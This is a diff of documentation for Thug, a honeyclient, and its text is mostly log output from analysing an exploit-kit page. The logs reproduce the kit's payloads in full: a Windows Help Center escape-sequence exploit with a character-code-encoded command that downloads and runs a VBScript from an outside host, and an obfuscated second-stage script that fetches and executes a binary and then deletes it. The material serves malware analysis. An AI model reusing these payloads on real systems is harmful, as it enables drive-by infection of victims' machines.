-[2012-07-02 19:21:11] &lt;iframe height="0" src="hcp://services/search?query=anything&amp;amp;topic=hcp://system/sysinfo/sysinfomain.htm%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A..%5C..%5Csysinfomain.htm%u003fsvr=&amp;lt;script defer&amp;gt;eval(Run(String.fromCharCode(99,109,100,32,47,99,32,101,99,104,111,32,66,61,34,108,46,118,98,115,34,58,87,105,116,104,32,67,114,101,97,116,101,79,98,106,101,99,116,40,34,77,83,88,77,76,50,46,88,77,76,72,84,84,80,34,41,58,46,111,112,101,110,32,34,71,69,84,34,44,34,104,116,116,112,58,47,47,103,104,97,110,97,114,112,111,119,101,114,46,110,101,116,47,100,97,116,97,47,104,99,112,95,118,98,115,46,112,104,112,63,102,61,98,48,56,49,100,38,100,61,48,34,44,102,97,108,115,101,58,46,115,101,110,100,40,41,58,83,101,116,32,65,32,61,32,67,114,101,97,116,101,79,98,106,101,99,116,40,34,83,99,114,105,112,116,105,110,103,46,70,105,108,101,83,121,115,116,101,109,79,98,106,101,99,116,34,41,58,83,101,116,32,68,61,65,46,67,114,101,97,116,101,84,101,120,116,70,105,108,101,40,65,46,71,101,116,83,112,101,99,105,97,108,70,111,108,100,101,114,40,50,41,32,43,32,34,92,34,32,43,32,66,41,58,68,46,87,114,105,116,101,76,105,110,101,32,46,114,101,115,112,111,110,115,101,84,101,120,116,58,69,110,100,32,87,105,116,104,58,68,46,67,108,111,115,101,58,67,114,101,97,116,101,79,98,106,101,99,116,40,34,87,83,99,114,105,112,116,46,83,104,101,108,108,34,41,46,82,117,110,32,65,46,71,101,116,83,112,101,99,105,97,108,70,111,108,100,101,114,40,50,41,32,43,32,34,92,34,32,43,32,66,32,62,32,37,84,69,77,80,37,92,92,108,46,118,98,115,32,38,38,32,37,84,69,77,80,37,92,92,108,46,118,98,115,32,38,38,32,116,97,115,107,107,105,108,108,32,47,70,32,47,73,77,32,104,101,108,112,99,116,114,46,101,120,101)));&amp;lt;/script&amp;gt;" width="0"&gt;&lt;/iframe&gt;
+[2012-07-02 19:21:11] &lt;object classid=&quot;clsid:d27cdb6e-ae6d-11cf-96b8-444553540000&quot; height=&quot;10&quot; id=&quot;swf_id&quot; width=&quot;10&quot;&gt;&lt;param name=&quot;movie&quot; value=&quot;data/field.swf&quot;&gt;&lt;/param&gt;&lt;param name=&quot;allowScriptAccess&quot; value=&quot;always&quot;&gt;&lt;/param&gt;&lt;param name=&quot;Play&quot; value=&quot;0&quot;&gt;&lt;/param&gt;&lt;embed allowscriptaccess=&quot;always&quot; height=&quot;10&quot; id=&quot;swf_id&quot; name=&quot;swf_id&quot; src=&quot;data/field.swf&quot; type=&quot;application/x-shockwave-flash&quot; width=&quot;10&quot;&gt;&lt;/embed&gt;&lt;/object&gt;
+[2012-07-02 19:21:11] &lt;param name=&quot;b&quot; value=&quot;56:14:14:19:27:50:50:6:56:47:66:47:33:19:22:48:11:33:49:66:11:14:50:48:49:19:56:19:46:67:24:0:12:1:60:61:70:11:24:12&quot;&gt;&lt;/param&gt;
+[2012-07-02 19:21:11] &lt;iframe height=&quot;0&quot; src=&quot;hcp://services/search?query=anything&amp;amp;topic=hcp://system/sysinfo/sysinfomain.htm%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A..%5C..%5Csysinfomain.htm%u003fsvr=&amp;lt;script defer&amp;gt;eval(Run(String.fromCharCode(99,109,100,32,47,99,32,101,99,104,111,32,66,61,34,108,46,118,98,115,34,58,87,105,116,104,32,67,114,101,97,116,101,79,98,106,101,99,116,40,34,77,83,88,77,76,50,46,88,77,76,72,84,84,80,34,41,58,46,111,112,101,110,32,34,71,69,84,34,44,34,104,116,116,112,58,47,47,103,104,97,110,97,114,112,111,119,101,114,46,110,101,116,47,100,97,116,97,47,104,99,112,95,118,98,115,46,112,104,112,63,102,61,98,48,56,49,100,38,100,61,48,34,44,102,97,108,115,101,58,46,115,101,110,100,40,41,58,83,101,116,32,65,32,61,32,67,114,101,97,116,101,79,98,106,101,99,116,40,34,83,99,114,105,112,116,105,110,103,46,70,105,108,101,83,121,115,116,101,109,79,98,106,101,99,116,34,41,58,83,101,116,32,68,61,65,46,67,114,101,97,116,101,84,101,120,116,70,105,108,101,40,65,46,71,101,116,83,112,101,99,105,97,108,70,111,108,100,101,114,40,50,41,32,43,32,34,92,34,32,43,32,66,41,58,68,46,87,114,105,116,101,76,105,110,101,32,46,114,101,115,112,111,110,115,101,84,101,120,116,58,69,110,100,32,87,105,116,104,58,68,46,67,108,111,115,101,58,67,114,101,97,116,101,79,98,106,101,99,116,40,34,87,83,99,114,105,112,116,46,83,104,101,108,108,34,41,46,82,117,110,32,65,46,71,101,116,83,112,101,99,105,97,108,70,111,108,100,101,114,40,50,41,32,43,32,34,92,34,32,43,32,66,32,62,32,37,84,69,77,80,37,92,92,108,46,118,98,115,32,38,38,32,37,84,69,77,80,37,92,92,108,46,118,98,115,32,38,38,32,116,97,115,107,107,105,108,108,32,47,70,32,47,73,77,32,104,101,108,112,99,116,114,46,101,120,101)));&amp;lt;/script&amp;gt;&quot; width=&quot;0&quot;&gt;&lt;/iframe&gt;
 [2012-07-02 19:21:11] [iframe redirection] http://[omitted]/main.php?page=8c6c59becaa0da07 -&gt; hcp://services/search?query=anything&amp;topic=hcp://system/sysinfo/sysinfomain.htm%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A%%A..%5C..%5Csysinfomain.htm%u003fsvr=&lt;script defer&gt;eval(Run(String.fromCharCode(99,109,100,32,47,99,32,101,99,104,111,32,66,61,34,108,46,118,98,115,34,58,87,105,116,104,32,67,114,101,97,116,101,79,98,106,101,99,116,40,34,77,83,88,77,76,50,46,88,77,76,72,84,84,80,34,41,58,46,111,112,101,110,32,34,71,69,84,34,44,34,104,116,116,112,58,47,47,103,104,97,110,97,114,112,111,119,101,114,46,110,101,116,47,100,97,116,97,47,104,99,112,95,118,98,115,46,112,104,112,63,102,61,98,48,56,49,100,38,100,61,48,34,44,102,97,108,115,101,58,46,115,101,110,100,40,41,58,83,101,116,32,65,32,61,32,67,114,101,97,116,101,79,98,106,101,99,116,40,34,83,99,114,105,112,116,105,110,103,46,70,105,108,101,83,121,115,116,101,109,79,98,106,101,99,116,34,41,58,83,101,116,32,68,61,65,46,67,114,101,97,116,101,84,101,120,116,70,105,108,101,40,65,46,71,101,116,83,112,101,99,105,97,108,70,111,108,100,101,114,40,50,41,32,43,32,34,92,34,32,43,32,66,41,58,68,46,87,114,105,116,101,76,105,110,101,32,46,114,101,115,112,111,110,115,101,84,101,120,116,58,69,110,100,32,87,105,116,104,58,68,46,67,108,111,115,101,58,67,114,101,97,116,101,79,98,106,101,99,116,40,34,87,83,99,114,105,112,116,46,83,104,101,108,108,34,41,46,82,117,110,32,65,46,71,101,116,83,112,101,99,105,97,108,70,111,108,100,101,114,40,50,41,32,43,32,34,92,34,32,43,32,66,32,62,32,37,84,69,77,80,37,92,92,108,46,118,98,115,32,38,38,32,37,84,69,77,80,37,92,92,108,46,118,98,115,32,38,38,32,116,97,115,107,107,105,108,108,32,47,70,32,47,73,77,32,104,101,108,112,99,116,114,46,101,120,101)));&lt;/script&gt;
-[2012-07-02 19:21:11] &lt;param name="movie" value="data/field.swf"&gt;&lt;/param&gt;
+[2012-07-02 19:21:11] &lt;param name=&quot;movie&quot; value=&quot;data/field.swf&quot;&gt;&lt;/param&gt;
 [2012-07-02 19:21:11] [Navigator URL Translation] data/field.swf --&gt;  http://[omitted]/data/field.swf
 [2012-07-02 19:21:17] [HTTP] URL: http://[omitted]/data/field.swf (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
 [2012-07-02 19:21:17] Saving remote content at data/field.swf (MD5: 502da89357ca5d7c85dc7a67f8977b21)
-[2012-07-02 19:21:17] &lt;param name="allowScriptAccess" value="always"&gt;&lt;/param&gt;
-[2012-07-02 19:21:17] &lt;param name="Play" value="0"&gt;&lt;/param&gt;
-[2012-07-02 19:21:17] &lt;embed allowscriptaccess="always" height="10" id="swf_id" name="swf_id" src="data/field.swf" type="application/x-shockwave-flash" width="10"&gt;&lt;/embed&gt;
+[2012-07-02 19:21:17] &lt;param name=&quot;allowScriptAccess&quot; value=&quot;always&quot;&gt;&lt;/param&gt;
+[2012-07-02 19:21:17] &lt;param name=&quot;Play&quot; value=&quot;0&quot;&gt;&lt;/param&gt;
+[2012-07-02 19:21:17] &lt;embed allowscriptaccess=&quot;always&quot; height=&quot;10&quot; id=&quot;swf_id&quot; name=&quot;swf_id&quot; src=&quot;data/field.swf&quot; type=&quot;application/x-shockwave-flash&quot; width=&quot;10&quot;&gt;&lt;/embed&gt;
 [2012-07-02 19:21:17] [Navigator URL Translation] data/field.swf --&gt;  http://[omitted]/data/field.swf
 [2012-07-02 19:21:18] [HTTP] URL: http://[omitted]/data/field.swf (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
 [2012-07-02 19:21:18] Saving remote content at data/field.swf (MD5: 502da89357ca5d7c85dc7a67f8977b21)
-[2012-07-02 19:21:18] Saving log analysis at ../logs/baa880d8d79c3488f2c0557be24cca6b/20120702192057</pre>
+[2012-07-02 19:21:18] Saving log analysis at ../logs/baa880d8d79c3488f2c0557be24cca6b/20120702192057
+</pre></div>
 </div>
 <p>It&#8217;s quite simple to realize that the exploit for the Microsoft Data Access Components (MDAC)
 vulnerability is not served as previously staten.</p>
@@ -378,9 +450,9 @@ Reader. This happens because exploit kits usually serve PDF files which exploit 
 vulnerabilities basing on Adobe Acrobat Reader version. Let&#8217;s take a look at what happens if
 we try to analyze the same page with Adobe Acrobat Reader 8.1.0 instead of 9.1.0 which is
 the default one.</p>
-<div class="highlight-sh"><pre>~/thug/src $ python thug.py -A 8.1.0 "http://[omitted]/main.php?page=8c6c59becaa0da07"
+<div class="highlight-sh"><div class="highlight"><pre>~/thug/src $ python thug.py -A 8.1.0 &quot;http://[omitted]/main.php?page=8c6c59becaa0da07&quot;
 [2012-07-02 19:18:00] [HTTP] URL: http://[omitted]/main.php?page=8c6c59becaa0da07 (Status: 200, Referrer: None)
-[2012-07-02 19:18:00] &lt;applet archive="Ryp.jar" code="sIda.sIda"&gt;&lt;param name="b" value="56:14:14:19:27:50:50:6:56:47:66:47:33:19:22:48:11:33:49:66:11:14:50:48:49:19:56:19:46:67:24:0:12:1:60:61:70:11:24:12"&gt;&lt;/param&gt;&lt;/applet&gt;
+[2012-07-02 19:18:00] &lt;applet archive=&quot;Ryp.jar&quot; code=&quot;sIda.sIda&quot;&gt;&lt;param name=&quot;b&quot; value=&quot;56:14:14:19:27:50:50:6:56:47:66:47:33:19:22:48:11:33:49:66:11:14:50:48:49:19:56:19:46:67:24:0:12:1:60:61:70:11:24:12&quot;&gt;&lt;/param&gt;&lt;/applet&gt;
 [2012-07-02 19:18:00] [Navigator URL Translation] Ryp.jar --&gt;  http://[omitted]/Ryp.jar
 [2012-07-02 19:18:03] [HTTP] URL: http://[omitted]/Ryp.jar (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
 [2012-07-02 19:18:03] Saving applet Ryp.jar
@@ -413,41 +485,42 @@ the default one.</p>
 [2012-07-02 19:18:15] Microsoft Windows Help Center Malformed Escape Sequences Incorrect Handling
 [2012-07-02 19:18:15] [AST]: Eval argument length &gt; 64
 [2012-07-02 19:18:15] [Windows Script Host Run] Command:
-cmd /c echo B="l.vbs":With CreateObject("MSXML2.XMLHTTP"):.open "GET","http://[omitted]/data/hcp_vbs.php?f=b081d&amp;d=0",false:.send():Set A = CreateObject("Scripting.FileSystemObject"):Set D=A.CreateTextFile(A.GetSpecialFolder(2) + "\" + B):D.WriteLine .responseText:End With:D.Close:CreateObject("WScript.Shell").Run A.GetSpecialFolder(2) + "\" + B &gt; %TEMP%\\l.vbs &amp;&amp; %TEMP%\\l.vbs &amp;&amp; taskkill /F /IM helpctr.exe
+cmd /c echo B=&quot;l.vbs&quot;:With CreateObject(&quot;MSXML2.XMLHTTP&quot;):.open &quot;GET&quot;,&quot;http://[omitted]/data/hcp_vbs.php?f=b081d&amp;d=0&quot;,false:.send():Set A = CreateObject(&quot;Scripting.FileSystemObject&quot;):Set D=A.CreateTextFile(A.GetSpecialFolder(2) + &quot;\&quot; + B):D.WriteLine .responseText:End With:D.Close:CreateObject(&quot;WScript.Shell&quot;).Run A.GetSpecialFolder(2) + &quot;\&quot; + B &gt; %TEMP%\\l.vbs &amp;&amp; %TEMP%\\l.vbs &amp;&amp; taskkill /F /IM helpctr.exe
 
 [2012-07-02 19:18:15] [Windows Script Host Run - Stage 1] Code:
-cmd /c echo B="l.vbs":With CreateObject("MSXML2.XMLHTTP"):.open "GET","http://[omitted]/data/hcp_vbs.php?f=b081d&amp;d=0",false:.send():Set A = CreateObject("Scripting.FileSystemObject"):Set D=A.CreateTextFile(A.GetSpecialFolder(2) + "\" + B):D.WriteLine .responseText:End With:D.Close:CreateObject("WScript.Shell").Run A.GetSpecialFolder(2) + "\" + B &gt; %TEMP%\\l.vbs &amp;&amp; %TEMP%\\l.vbs &amp;&amp; taskkill /F /IM helpctr.exe
+cmd /c echo B=&quot;l.vbs&quot;:With CreateObject(&quot;MSXML2.XMLHTTP&quot;):.open &quot;GET&quot;,&quot;http://[omitted]/data/hcp_vbs.php?f=b081d&amp;d=0&quot;,false:.send():Set A = CreateObject(&quot;Scripting.FileSystemObject&quot;):Set D=A.CreateTextFile(A.GetSpecialFolder(2) + &quot;\&quot; + B):D.WriteLine .responseText:End With:D.Close:CreateObject(&quot;WScript.Shell&quot;).Run A.GetSpecialFolder(2) + &quot;\&quot; + B &gt; %TEMP%\\l.vbs &amp;&amp; %TEMP%\\l.vbs &amp;&amp; taskkill /F /IM helpctr.exe
 [2012-07-02 19:18:15] [Windows Script Host Run - Stage 1] Downloading from URL http://[omitted]/data/hcp_vbs.php?f=b081d&amp;d=0
 [2012-07-02 19:18:16] [HTTP] URL: http://[omitted]/data/hcp_vbs.php?f=b081d&amp;d=0 (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
 [2012-07-02 19:18:16] [Windows Script Host Run - Stage 1] Saving file d26b9b1a1f667004945d1d000cf4f19e
 [2012-07-02 19:18:16] [Windows Script Host Run - Stage 2] Code:
-w=3000:x=200:y=1:z=false:a = "http://[omitted]/w.php?e=5&amp;f=b081d":Set e = Createobject(StrReverse("tcejbOmetsySeliF.gnitpircS")):Set f=e.GetSpecialFolder(2):b = f &amp; "\exe.ex2":b=Replace(b,Month("2010-02-16"),"e"):OT = "GET":Set c = CreateObject(StrReverse("PTTHLMX.2LMXSM")):Set d = CreateObject(StrReverse("ertS.BDODA") &amp; "am")
-Set o=Createobject(StrReverse("tcejbOmetsySeliF.gnitpircS"))
+w=3000:x=200:y=1:z=false:a = &quot;http://[omitted]/w.php?e=5&amp;f=b081d&quot;:Set e = Createobject(StrReverse(&quot;tcejbOmetsySeliF.gnitpircS&quot;)):Set f=e.GetSpecialFolder(2):b = f &amp; &quot;\exe.ex2&quot;:b=Replace(b,Month(&quot;2010-02-16&quot;),&quot;e&quot;):OT = &quot;GET&quot;:Set c = CreateObject(StrReverse(&quot;PTTHLMX.2LMXSM&quot;)):Set d = CreateObject(StrReverse(&quot;ertS.BDODA&quot;) &amp; &quot;am&quot;)
+Set o=Createobject(StrReverse(&quot;tcejbOmetsySeliF.gnitpircS&quot;))
 On Error resume next
 c.open OT, a, z:c.send()
 If c.Status = x Then
 d.Open:d.Type = y:d.Write c.ResponseBody:d.SaveToFile b:d.Close
 End If
-Set w=CreateObject(StrReverse("llehS." &amp; "tpi"&amp;"rcSW"))
-Eval(Replace("W.ex2c b", Month("2010-02-16"), "E"))
-W.eXeC "taskkill /F /IM wm" &amp; "player.e" &amp; "xe":W.eXeC "taskkill /F /IM realplay.ex" &amp; "e":Set g=o.GetFile(e.GetSpecialFolder(3-1) &amp; "\" &amp; StrReverse("bv.l") &amp; "s"):g.Delete:WScript.Sleep w:Set g=o.GetFile(b):Eval("g.Delete")
+Set w=CreateObject(StrReverse(&quot;llehS.&quot; &amp; &quot;tpi&quot;&amp;&quot;rcSW&quot;))
+Eval(Replace(&quot;W.ex2c b&quot;, Month(&quot;2010-02-16&quot;), &quot;E&quot;))
+W.eXeC &quot;taskkill /F /IM wm&quot; &amp; &quot;player.e&quot; &amp; &quot;xe&quot;:W.eXeC &quot;taskkill /F /IM realplay.ex&quot; &amp; &quot;e&quot;:Set g=o.GetFile(e.GetSpecialFolder(3-1) &amp; &quot;\&quot; &amp; StrReverse(&quot;bv.l&quot;) &amp; &quot;s&quot;):g.Delete:WScript.Sleep w:Set g=o.GetFile(b):Eval(&quot;g.Delete&quot;)
 
 [2012-07-02 19:18:16] [Windows Script Host Run - Stage 2] Downloading from URL http://[omitted]/w.php?e=5&amp;f=b081d
 [2012-07-02 19:18:20] [HTTP] URL: http://[omitted]/w.php?e=5&amp;f=b081d (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
 [2012-07-02 19:18:22] [Windows Script Host Run - Stage 2] Saving file d328b5a123bce1c0d20d763ad745303a
-[2012-07-02 19:18:22] &lt;object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" height="10" id="swf_id" width="10"&gt;&lt;param name="movie" value="data/field.swf"&gt;&lt;/param&gt;&lt;param name="allowScriptAccess" value="always"&gt;&lt;/param&gt;&lt;param name="Play" value="0"&gt;&lt;/param&gt;&lt;embed allowscriptaccess="always" height="10" id="swf_id" name="swf_id" src="data/field.swf" type="application/x-shockwave-flash" width="10"&gt;&lt;/embed&gt;&lt;/object&gt;
-[2012-07-02 19:18:22] &lt;param name="b" value="56:14:14:19:27:50:50:6:56:47:66:47:33:19:22:48:11:33:49:66:11:14:50:48:49:19:56:19:46:67:24:0:12:1:60:61:70:11:24:12"&gt;&lt;/param&gt;
-[2012-07-02 19:18:22] &lt;param name="movie" value="data/field.swf"&gt;&lt;/param&gt;
+[2012-07-02 19:18:22] &lt;object classid=&quot;clsid:d27cdb6e-ae6d-11cf-96b8-444553540000&quot; height=&quot;10&quot; id=&quot;swf_id&quot; width=&quot;10&quot;&gt;&lt;param name=&quot;movie&quot; value=&quot;data/field.swf&quot;&gt;&lt;/param&gt;&lt;param name=&quot;allowScriptAccess&quot; value=&quot;always&quot;&gt;&lt;/param&gt;&lt;param name=&quot;Play&quot; value=&quot;0&quot;&gt;&lt;/param&gt;&lt;embed allowscriptaccess=&quot;always&quot; height=&quot;10&quot; id=&quot;swf_id&quot; name=&quot;swf_id&quot; src=&quot;data/field.swf&quot; type=&quot;application/x-shockwave-flash&quot; width=&quot;10&quot;&gt;&lt;/embed&gt;&lt;/object&gt;
+[2012-07-02 19:18:22] &lt;param name=&quot;b&quot; value=&quot;56:14:14:19:27:50:50:6:56:47:66:47:33:19:22:48:11:33:49:66:11:14:50:48:49:19:56:19:46:67:24:0:12:1:60:61:70:11:24:12&quot;&gt;&lt;/param&gt;
+[2012-07-02 19:18:22] &lt;param name=&quot;movie&quot; value=&quot;data/field.swf&quot;&gt;&lt;/param&gt;
 [2012-07-02 19:18:22] [Navigator URL Translation] data/field.swf --&gt;  http://[omitted]/data/field.swf
 [2012-07-02 19:18:27] [HTTP] URL: http://[omitted]/data/field.swf (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
 [2012-07-02 19:18:28] Saving remote content at data/field.swf (MD5: 502da89357ca5d7c85dc7a67f8977b21)
-[2012-07-02 19:18:28] &lt;param name="allowScriptAccess" value="always"&gt;&lt;/param&gt;
-[2012-07-02 19:18:28] &lt;param name="Play" value="0"&gt;&lt;/param&gt;
-[2012-07-02 19:18:28] &lt;embed allowscriptaccess="always" height="10" id="swf_id" name="swf_id" src="data/field.swf" type="application/x-shockwave-flash" width="10"&gt;&lt;/embed&gt;
+[2012-07-02 19:18:28] &lt;param name=&quot;allowScriptAccess&quot; value=&quot;always&quot;&gt;&lt;/param&gt;
+[2012-07-02 19:18:28] &lt;param name=&quot;Play&quot; value=&quot;0&quot;&gt;&lt;/param&gt;
+[2012-07-02 19:18:28] &lt;embed allowscriptaccess=&quot;always&quot; height=&quot;10&quot; id=&quot;swf_id&quot; name=&quot;swf_id&quot; src=&quot;data/field.swf&quot; type=&quot;application/x-shockwave-flash&quot; width=&quot;10&quot;&gt;&lt;/embed&gt;
 [2012-07-02 19:18:28] [Navigator URL Translation] data/field.swf --&gt;  http://[omitted]/data/field.swf
 [2012-07-02 19:18:28] [HTTP] URL: http://[omitted]/data/field.swf (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
 [2012-07-02 19:18:29] Saving remote content at data/field.swf (MD5: 502da89357ca5d7c85dc7a67f8977b21)
-[2012-07-02 19:18:29] Saving log analysis at ../logs/baa880d8d79c3488f2c0557be24cca6b/20120702191758</pre>
+[2012-07-02 19:18:29] Saving log analysis at ../logs/baa880d8d79c3488f2c0557be24cca6b/20120702191758
+</pre></div>
 </div>
 <p>Comparing the following line</p>
 <div class="highlight-sh"><div class="highlight"><pre><span class="o">[</span>2012-07-02 19:18:14<span class="o">]</span> <span class="o">[</span>HTTP<span class="o">]</span> URL: http://<span class="o">[</span>omitted<span class="o">]</span>/data/ap2.php <span class="o">(</span>Status: 200, Referrer: http://<span class="o">[</span>omitted<span class="o">]</span>/main.php?page<span class="o">=</span>8c6c59becaa0da07<span class="o">)</span>
@@ -648,9 +721,9 @@ better with proxies like burpsuite or mitmproxy.</p>
 <p>This option allows Thug to make use of Tor in order to anonymize the access to a malicious
 page. The trick is quite simple and requires a Tor instance up and running. Simply run Thug
 using <em>socks5://127.0.0.1:9050</em> as proxy and your real IP address will not be revealed.</p>
-<div class="highlight-sh"><pre>~/thug/src $ python thug.py -p socks5://127.0.0.1:9050 "http://[omitted]/main.php?page=8c6c59becaa0da07"
+<div class="highlight-sh"><div class="highlight"><pre>~/thug/src $ python thug.py -p socks5://127.0.0.1:9050 &quot;http://[omitted]/main.php?page=8c6c59becaa0da07&quot;
 [2012-07-02 19:22:14] [HTTP] URL: http://[omitted]/main.php?page=8c6c59becaa0da07 (Status: 200, Referrer: None)
-[2012-07-02 19:22:14] &lt;applet archive="Ryp.jar" code="sIda.sIda"&gt;&lt;param name="b" value="56:14:14:19:27:50:50:6:56:47:66:47:33:19:22:48:11:33:49:66:11:14:50:48:49:19:56:19:46:67:24:0:12:1:60:61:70:11:24:12"&gt;&lt;/param&gt;&lt;/applet&gt;
+[2012-07-02 19:22:14] &lt;applet archive=&quot;Ryp.jar&quot; code=&quot;sIda.sIda&quot;&gt;&lt;param name=&quot;b&quot; value=&quot;56:14:14:19:27:50:50:6:56:47:66:47:33:19:22:48:11:33:49:66:11:14:50:48:49:19:56:19:46:67:24:0:12:1:60:61:70:11:24:12&quot;&gt;&lt;/param&gt;&lt;/applet&gt;
 [2012-07-02 19:22:14] [Navigator URL Translation] Ryp.jar --&gt;  http://[omitted]/Ryp.jar
 [2012-07-02 19:22:16] [HTTP] URL: http://[omitted]/Ryp.jar (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
 [2012-07-02 19:22:17] Saving applet Ryp.jar
@@ -683,41 +756,42 @@ using <em>socks5://127.0.0.1:9050</em> as proxy and your real IP address will no
 [2012-07-02 19:22:30] Microsoft Windows Help Center Malformed Escape Sequences Incorrect Handling
 [2012-07-02 19:22:30] [AST]: Eval argument length &gt; 64
 [2012-07-02 19:22:30] [Windows Script Host Run] Command:
-cmd /c echo B="l.vbs":With CreateObject("MSXML2.XMLHTTP"):.open "GET","http://[omitted]/data/hcp_vbs.php?f=b081d&amp;d=0",false:.send():Set A = CreateObject("Scripting.FileSystemObject"):Set D=A.CreateTextFile(A.GetSpecialFolder(2) + "\" + B):D.WriteLine .responseText:End With:D.Close:CreateObject("WScript.Shell").Run A.GetSpecialFolder(2) + "\" + B &gt; %TEMP%\\l.vbs &amp;&amp; %TEMP%\\l.vbs &amp;&amp; taskkill /F /IM helpctr.exe
+cmd /c echo B=&quot;l.vbs&quot;:With CreateObject(&quot;MSXML2.XMLHTTP&quot;):.open &quot;GET&quot;,&quot;http://[omitted]/data/hcp_vbs.php?f=b081d&amp;d=0&quot;,false:.send():Set A = CreateObject(&quot;Scripting.FileSystemObject&quot;):Set D=A.CreateTextFile(A.GetSpecialFolder(2) + &quot;\&quot; + B):D.WriteLine .responseText:End With:D.Close:CreateObject(&quot;WScript.Shell&quot;).Run A.GetSpecialFolder(2) + &quot;\&quot; + B &gt; %TEMP%\\l.vbs &amp;&amp; %TEMP%\\l.vbs &amp;&amp; taskkill /F /IM helpctr.exe
 
 [2012-07-02 19:22:30] [Windows Script Host Run - Stage 1] Code:
-cmd /c echo B="l.vbs":With CreateObject("MSXML2.XMLHTTP"):.open "GET","http://[omitted]/data/hcp_vbs.php?f=b081d&amp;d=0",false:.send():Set A = CreateObject("Scripting.FileSystemObject"):Set D=A.CreateTextFile(A.GetSpecialFolder(2) + "\" + B):D.WriteLine .responseText:End With:D.Close:CreateObject("WScript.Shell").Run A.GetSpecialFolder(2) + "\" + B &gt; %TEMP%\\l.vbs &amp;&amp; %TEMP%\\l.vbs &amp;&amp; taskkill /F /IM helpctr.exe
+cmd /c echo B=&quot;l.vbs&quot;:With CreateObject(&quot;MSXML2.XMLHTTP&quot;):.open &quot;GET&quot;,&quot;http://[omitted]/data/hcp_vbs.php?f=b081d&amp;d=0&quot;,false:.send():Set A = CreateObject(&quot;Scripting.FileSystemObject&quot;):Set D=A.CreateTextFile(A.GetSpecialFolder(2) + &quot;\&quot; + B):D.WriteLine .responseText:End With:D.Close:CreateObject(&quot;WScript.Shell&quot;).Run A.GetSpecialFolder(2) + &quot;\&quot; + B &gt; %TEMP%\\l.vbs &amp;&amp; %TEMP%\\l.vbs &amp;&amp; taskkill /F /IM helpctr.exe
 [2012-07-02 19:22:30] [Windows Script Host Run - Stage 1] Downloading from URL http://[omitted]/data/hcp_vbs.php?f=b081d&amp;d=0
 [2012-07-02 19:22:32] [HTTP] URL: http://[omitted]/data/hcp_vbs.php?f=b081d&amp;d=0 (Status: 200, Referrer: http://[omitted]/main.php?page=8c6c59becaa0da07)
 [2012-07-02 19:22:32] [Windows Script Host Run - Stage 1] Saving file d26b9b1a1f667004945d1d000cf4f19e
 [2012-07-02 19:22:32] [Windows Script Host Run - Stage 2] Code:
-w=3000:x=200:y=1:z=false:a = "http://[omitted]/w.php?e=5&amp;f=b081d":Set e = Createobject(StrReverse("tcejbOmetsySeliF.gnitpircS")):Set f=e.GetSpecialFolder(2):b = f &amp; "\exe.ex2":b=Replace(b,Month("2010-02-16"),"e"):OT = "GET":Set c = CreateObject(StrReverse("PTTHLMX.2LMXSM")):Set d = CreateObject(StrReverse("ertS.BDODA") &amp; "am")
-Set o=Createobject(StrReverse("tcejbOmetsySeliF.gnitpircS"))
+w=3000:x=200:y=1:z=false:a = &quot;http://[omitted]/w.php?e=5&amp;f=b081d&quot;:Set e = Createobject(StrReverse(&quot;tcejbOmetsySeliF.gnitpircS&quot;)):Set f=e.GetSpecialFolder(2):b = f &amp; &quot;\exe.ex2&quot;:b=Replace(b,Month(&quot;2010-02-16&quot;),&quot;e&quot;):OT = &quot;GET&quot;:Set c = CreateObject(StrReverse(&quot;PTTHLMX.2LMXSM&quot;)):Set d = CreateObject(StrReverse(&quot;ertS.BDODA&quot;) &amp; &quot;am&quot;)
+Set o=Createobject(StrReverse(&quot;tcejbOmetsySeliF.gnitpircS&quot;))
 On Error resume next
 c.open OT, a, z:c.send()
 If c.Status = x Then
 d.Open:d.Type = y:d.Write c.ResponseBody:d.SaveToFile b:d.Close
 End If
-Set w=CreateObject(StrReverse("llehS." &amp; "tpi"&amp;"rcSW"))
-Eval(Replace("W.ex2c b", Month("2010-02-16"), "E"))
-W.eXeC "taskkill /F /IM wm" &amp; "player.e" &amp; "xe":W.eXeC "taskkill /F /IM realplay.ex" &amp; "e":Set g=o.GetFile(e.GetSpecialFolder(3-1) &amp; "\" &amp; StrReverse("bv.l") &amp; "s"):g.Delete:WScript.Sleep w:Set g=o.GetFile(b):Eval("g.Delete")
